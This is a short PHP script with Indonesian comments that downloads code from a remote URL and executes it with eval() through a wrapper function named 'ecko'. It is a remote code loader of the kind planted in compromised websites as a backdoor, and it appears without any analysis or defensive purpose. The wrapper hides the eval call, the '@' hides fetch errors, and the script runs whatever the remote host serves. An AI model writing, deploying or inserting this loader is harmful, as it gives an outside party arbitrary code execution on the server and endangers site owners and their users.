<?php
function ecko($code) {
    eval("?>".$code);
}

$url = "https://example.com/file.php"; // URL target
$code = @file_get_contents($url);

if ($code === false || empty($code)) {
    die("Gagal mengambil atau konten kosong.");
}

// Eksekusi pakai ecko()
ecko($code);
